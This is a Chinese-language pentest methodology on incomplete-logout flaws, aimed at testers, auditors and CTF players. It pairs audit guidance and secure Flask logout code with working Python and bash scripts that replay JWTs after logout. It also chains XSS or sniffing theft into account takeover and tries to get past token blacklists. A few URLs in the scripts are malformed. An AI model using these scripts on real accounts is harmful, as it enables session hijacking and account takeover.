# 不完整登出攻击方法论

## 第一部分：文档概述

### 1.1 编写目的
本文档为渗透测试人员提供一套标准化、可复现的不完整登出攻击流程，用于检测和利用会话终止机制中的缺陷。通过系统性的方法论，帮助测试人员发现并验证登出后会话/令牌仍然有效的漏洞，实现会话劫持和未授权访问。

### 1.2 适用范围
本文档适用于以下场景：
- 登出时仅清除服务器端会话，未清除客户端令牌（JWT/Cookie）
- JWT 令牌无过期时间（exp claim）
- 无令牌撤销机制（token revocation/blacklist）
- 混合认证系统（Session + JWT）的登出不完整
- Flask/Python/Django 等 Web 应用的登出实现

### 1.3 读者对象
- 执行渗透测试的安全工程师
- 进行代码审计的安全分析师
- 负责认证系统开发的开发人员
- CTF 竞赛参与者

---

## 第二部分：核心渗透技术专题

### 专题一：不完整登出攻击

#### 2.1 技术介绍

不完整登出（Incomplete Logout）是指应用程序在用户登出时，未能完全终止所有认证状态，导致客户端持有的令牌（如 JWT、Cookie）在登出后仍然有效。攻击者可以利用这些"僵尸令牌"重新获得对已登出账户的访问权限。

**漏洞本质：**
- 登出时仅清除服务器端会话，未使客户端令牌失效
- JWT 令牌无过期时间，永久有效
- 无令牌撤销列表（Token Blacklist）机制
- 混合认证系统中，仅清除部分认证凭据

**攻击原理：**
```
正常流程：
用户登录 → 获得 Session + JWT → 访问资源 → 点击登出 → Session 清除 + JWT 清除 → 令牌失效

攻击流程：
攻击者窃取/捕获 JWT → 用户登出（仅清除 Session） → JWT 仍然有效 → 攻击者使用旧 JWT + 新 Session → 重新获得访问权限
```

#### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 混合认证系统 | Session + JWT 双令牌 | 登出时仅清除 Session，JWT 未清除 |
| 单页应用 (SPA) | 前端存储 JWT | 登出时前端未清除 localStorage 中的 JWT |
| 移动端应用 | 本地存储令牌 | 登出时未清除本地存储的认证令牌 |
| 多设备登录 | 多端同时在线 | 一端登出，其他端令牌仍然有效 |
| CTF 挑战 | JWT 认证 | 故意配置登出不完整，供参赛者利用 |

#### 2.3 漏洞探测方法

##### 2.3.1 黑盒测试

**步骤 1：捕获登录后的令牌**
```bash
# 登录并捕获令牌
curl -i -X POST http://target/login \
  -d "username=test&password=test" \
  -c cookies.txt

# 查看捕获的令牌
cat cookies.txt

# 预期输出：
# auth_token    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
# session       eyJ1c2VyX2lkIjoxMDAzMn0...
```

**步骤 2：执行登出操作**
```bash
# 使用捕获的 Cookie 登出
curl -i -X POST http://target/logout \
  -b cookies.txt

# 观察响应头中的 Set-Cookie
# 预期（安全实现）：
# Set-Cookie: auth_token=; expires=Thu, 01 Jan 1970 00:00:00 GMT
# Set-Cookie: session=; expires=Thu, 01 Jan 1970 00:00:00 GMT

# 预期（不安全实现）：
# 无 Set-Cookie 头（JWT 未清除）
# 或仅清除 session，未清除 auth_token
```

**步骤 3：验证令牌是否仍然有效**
```bash
# 检查登出后的 Cookie 文件
cat cookies.txt | grep auth_token

# 如果 auth_token 仍然存在，说明未清除

# 尝试使用旧 JWT 访问资源
curl -i http://target/dashboard \
  -b "session=NEW_SESSION; auth_token=OLD_JWT"

# 如果返回 200 OK，说明 JWT 仍然有效
```

**步骤 4：令牌重放测试**
```python
import requests

# 步骤 1：登录获取 JWT
session = requests.Session()
session.post("http://target/login",
            data={"username": "test", "password": "test"})

# 捕获 JWT
old_jwt = session.cookies.get('auth_token')
print(f"Captured JWT: {old_jwt}")

# 步骤 2：登出
session.post("http/target/logout")

# 步骤 3：重新登录（获取新 Session）
session.post("http://target/login",
            data={"username": "test", "password": "test"})

# 步骤 4：用旧 JWT 替换新 JWT
session.cookies.set('auth_token', old_jwt)

# 步骤 5：测试旧 JWT 是否有效
response = session.get("http://target/dashboard")
if response.status_code == 200:
    print("[+] VULNERABILITY CONFIRMED: Old JWT still valid after logout")
else:
    print("[-] JWT properly invalidated on logout")
```

##### 2.3.2 白盒测试

**代码审计要点：**

1. **查找登出实现**
```bash
# Python/Flask
grep -r "logout" . --include="*.py"
grep -r "session.pop" . --include="*.py"
grep -r "set_cookie.*auth_token" . --include="*.py"

# Django
grep -r "logout" . --include="*.py"
grep -r "flush" . --include="*.py"

# Node.js
grep -r "logout" . --include="*.js"
grep -r "clearCookie" . --include="*.js"
```

2. **检查登出逻辑**
```python
# 危险实现示例（Flask）
@app.route('/logout', methods=['POST'])
def logout():
    session.pop('user_id', None)  # 仅清除 session
    return redirect(url_for('login'))
    # 缺少：resp.set_cookie('auth_token', '', expires=0)

# 安全实现示例
@app.route('/logout', methods=['POST'])
def logout():
    session.pop('user_id', None)
    resp = redirect(url_for('login'))
    resp.set_cookie('auth_token', '', expires=0)  # 清除 JWT
    resp.set_cookie('session', '', expires=0)  # 清除 session
    return resp
```

3. **检查 JWT 过期配置**
```python
# 危险实现：JWT 无过期时间
token = jwt.encode({
    "username": username,
    "user_id": user.id,
    "user_type": "customer"
    # 缺少："exp": datetime.utcnow() + timedelta(hours=1)
}, SECRET_KEY, algorithm='HS256')

# 安全实现：JWT 有过期时间
from datetime import datetime, timedelta

token = jwt.encode({
    "username": username,
    "user_id": user.id,
    "exp": datetime.utcnow() + timedelta(hours=1)  # 1 小时后过期
}, SECRET_KEY, algorithm='HS256')
```

#### 2.4 漏洞利用方法

##### 2.4.1 基础令牌重放

**方法 1：直接重放旧 JWT**
```python
import requests

def replay_jwt_after_logout():
    # 步骤 1：登录
    session = requests.Session()
    session.post("http://localhost:44191/password/test",
                data={"password": "test", "username": "test"})
    
    # 捕获 JWT
    old_jwt = session.cookies.get('auth_token')
    print(f"Step 1: JWT captured - {old_jwt[:50]}...")
    
    # 步骤 2：验证 JWT 有效
    r = session.get("http://localhost:44191/dashboard")
    assert r.status_code == 200
    print("Step 2: Dashboard accessible with original session")
    
    # 步骤 3：登出
    session.post("http://localhost:44191/logout")
    print("Step 3: User logged out")
    
    # 步骤 4：验证 JWT 未清除
    if session.cookies.get('auth_token'):
        print("Step 4: JWT NOT cleared from cookies")
    else:
        print("Step 4: JWT cleared from cookies")
        return
    
    # 步骤 5：重新登录（获取新 session）
    session.post("http://localhost:44191/password/test",
                data={"password": "test", "username": "test"})
    print("Step 5: User logged in again (new session)")
    
    # 步骤 6：用旧 JWT 替换
    session.cookies.set('auth_token', old_jwt)
    print("Step 6: Replaced new JWT with old JWT")
    
    # 步骤 7：测试旧 JWT
    r = session.get("http://localhost:44191/dashboard")
    if r.status_code == 200:
        print(f"Step 7: VULNERABILITY CONFIRMED - Dashboard accessible with old JWT")
        print(f"Response: {r.text[:200]}...")
    else:
        print(f"Step 7: Old JWT rejected (status: {r.status_code})")

# 执行测试
replay_jwt_after_logout()
```

**方法 2：跨会话令牌重放**
```python
import requests

def cross_session_replay():
    # 会话 A：受害者登录
    victim_session = requests.Session()
    victim_session.post("http://target/login",
                       data={"username": "victim", "password": "password123"})
    victim_jwt = victim_session.cookies.get('auth_token')
    
    # 攻击者捕获 JWT（通过 XSS、网络嗅探等）
    print(f"Attacker captured victim's JWT: {victim_jwt[:50]}...")
    
    # 受害者登出
    victim_session.post("http/target/logout")
    print("Victim logged out")
    
    # 会话 B：攻击者使用捕获的 JWT
    attacker_session = requests.Session()
    attacker_session.cookies.set('auth_token', victim_jwt)
    
    # 攻击者访问受害者账户
    r = attacker_session.get("http://target/dashboard")
    if r.status_code == 200:
        print("[+] SUCCESS: Attacker accessed victim's account after logout")
```

##### 2.4.2 组合攻击链

**攻击链：XSS 窃取 → 登出后重放 → 权限维持**
```python
import requests
import time

def xss_token_theft_chain():
    # 步骤 1：通过 XSS 窃取 JWT（模拟）
    # 实际场景中，攻击者通过 XSS payload 获取 document.cookie
    stolen_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJ1c2VyX2lkIjoxMDAzMn0..."
    print(f"Step 1: JWT stolen via XSS - {stolen_jwt[:50]}...")
    
    # 步骤 2：等待受害者登出
    print("Step 2: Waiting for victim to log out...")
    time.sleep(2)  # 模拟等待
    
    # 步骤 3：攻击者使用窃取的 JWT
    attacker = requests.Session()
    attacker.cookies.set('auth_token', stolen_jwt)
    
    # 步骤 4：访问受害者账户
    r = attacker.get("http://localhost:44191/dashboard")
    if r.status_code == 200:
        print("Step 4: SUCCESS - Attacker accessed account after victim logout")
        print(f"Dashboard content: {r.text[:200]}...")
    
    # 步骤 5：权限维持（JWT 永久有效）
    print("Step 5: JWT remains valid indefinitely - persistent access possible")

# 执行攻击链
xss_token_theft_chain()
```

**攻击链：网络嗅探 → 令牌重放 → 账户接管**
```bash
#!/bin/bash

# 场景：HTTP 明文传输，攻击者嗅探网络获取 JWT

# 步骤 1：嗅探网络流量（需要网络访问权限）
# tcpdump -i eth0 -s 0 -A 'tcp port 80' | grep -i "auth_token"

# 步骤 2：提取 JWT
CAPTURED_JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# 步骤 3：等待目标登出
echo "Waiting for target to log out..."
sleep 10

# 步骤 4：使用捕获的 JWT 访问账户
curl -H "Cookie: auth_token=$CAPTURED_JWT" \
     http://target/dashboard

# 步骤 5：如果返回 200，说明 JWT 仍然有效
# 攻击者可以持续访问，直到 JWT 自然过期（如果配置了过期时间）
```

#### 2.5 漏洞利用绕过方法

##### 2.5.1 绕过 JWT 过期检查

**场景：JWT 有过期时间，但时间较长**

**方法 1：在过期前使用**
```python
import jwt
from datetime import datetime

# 解码 JWT 查看过期时间
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
decoded = jwt.decode(token, options={"verify_signature": False})

exp_timestamp = decoded.get('exp')
if exp_timestamp:
    exp_time = datetime.fromtimestamp(exp_timestamp)
    print(f"JWT expires at: {exp_time}")
    
    # 在过期前尽快使用
    # 如果还有很长时间，可以设置定时任务定期刷新
```

**方法 2：刷新令牌（如果应用支持）**
```python
import requests

def refresh_token():
    # 有些应用在 JWT 快过期时提供刷新端点
    session = requests.Session()
    session.cookies.set('auth_token', old_jwt)
    
    # 尝试刷新
    r = session.post("http://target/refresh")
    if r.status_code == 200:
        new_jwt = r.cookies.get('auth_token')
        print(f"Token refreshed: {new_jwt[:50]}...")
```

##### 2.5.2 绕过令牌撤销检查

**场景：应用有令牌黑名单，但检查不严格**

**方法：使用 JWT 变体**
```python
import jwt

# 如果应用仅检查完整的 JWT 字符串是否在黑名单中
# 可以尝试修改 JWT 格式（如果签名验证被禁用）

# 方法 1：添加额外 claims
original_payload = {"user_id": 10019, "username": "test"}
modified_payload = {"user_id": 10019, "username": "test", "iat": 1234567890}

# 如果签名验证被禁用，修改后的 JWT 可能仍然有效
modified_jwt = jwt.encode(modified_payload, "any_secret", algorithm="HS256")
```

---

## 第三部分：附录

### 3.1 常用 Payload 速查表

| 类别 | 测试点 | Payload 示例 | 说明 |
|-----|-------|------------|------|
| 登出测试 | POST /logout | 正常登出请求 | 观察 Set-Cookie 头 |
| 令牌重放 | GET /dashboard | 旧 JWT + 新 Session | 测试 JWT 是否有效 |
| 跨会话重放 | GET /dashboard | 窃取的 JWT | 测试跨会话有效性 |
| 过期检查 | 解码 JWT | `jwt.decode(token)` | 查看 exp claim |

### 3.2 自动化工具

**Python 测试脚本：**
```python
#!/usr/bin/env python3
"""
Incomplete Logout Tester
Usage: python3 incomplete_logout_test.py -t http://target
"""

import argparse
import requests
import sys

def test_incomplete_logout(target):
    print(f"[*] Testing incomplete logout at {target}")
    
    # 步骤 1：登录
    print("[*] Step 1: Logging in...")
    session = requests.Session()
    
    login_data = {"username": "test", "password": "test"}
    login_response = session.post(f"{target}/login", data=login_data)
    
    if login_response.status_code not in [200, 302]:
        print("[-] Login failed, cannot test logout")
        return False
    
    # 捕获 JWT
    jwt_before = session.cookies.get('auth_token')
    if not jwt_before:
        jwt_before = session.cookies.get('token')
    if not jwt_before:
        print("[-] No JWT token found, cannot test")
        return False
    
    print(f"[+] JWT captured: {jwt_before[:50]}...")
    
    # 步骤 2：登出
    print("[*] Step 2: Logging out...")
    logout_response = session.post(f"{target}/logout")
    
    # 检查 Set-Cookie 头
    set_cookie = logout_response.headers.get('Set-Cookie', '')
    
    if 'auth_token=;' in set_cookie or 'auth_token=; expires' in set_cookie:
        print("[+] JWT properly cleared in logout response")
        jwt_cleared = True
    else:
        print("[-] JWT NOT cleared in logout response")
        jwt_cleared = False
    
    # 步骤 3：检查 Cookie jar
    jwt_in_jar = session.cookies.get('auth_token')
    if jwt_in_jar:
        print(f"[-] JWT still in cookie jar: {jwt_in_jar[:50]}...")
    else:
        print("[+] JWT cleared from cookie jar")
    
    # 步骤 4：令牌重放测试
    print("[*] Step 4: Testing token replay...")
    
    # 重新登录获取新 session
    session.post(f"{target}/login", data=login_data)
    
    # 替换为旧 JWT
    session.cookies.set('auth_token', jwt_before)
    
    # 测试访问
    test_response = session.get(f"{target}/dashboard")
    
    if test_response.status_code == 200:
        print("[+] VULNERABILITY CONFIRMED: Old JWT still valid after logout")
        return True
    else:
        print(f"[-] Old JWT rejected (status: {test_response.status_code})")
        return False

def main():
    parser = argparse.ArgumentParser(description='Incomplete Logout Tester')
    parser.add_argument('-t', '--target', required=True, help='Target URL')
    args = parser.parse_args()
    
    vulnerable = test_incomplete_logout(args.target)
    
    if vulnerable:
        print("\n[!] Target is VULNERABLE to incomplete logout attack")
        sys.exit(1)
    else:
        print("\n[*] Target appears to handle logout correctly")
        sys.exit(0)

if __name__ == '__main__':
    main()
```

### 3.3 参考资源

- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OWASP JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [PortSwigger - Authentication Vulnerabilities](https://portswigger.net/web-security/authentication)

---

**文档版本：** 1.0  
**最后更新：** 2026 年 3 月 14 日  
**适用技能：** authentication-failures, broken-access-control
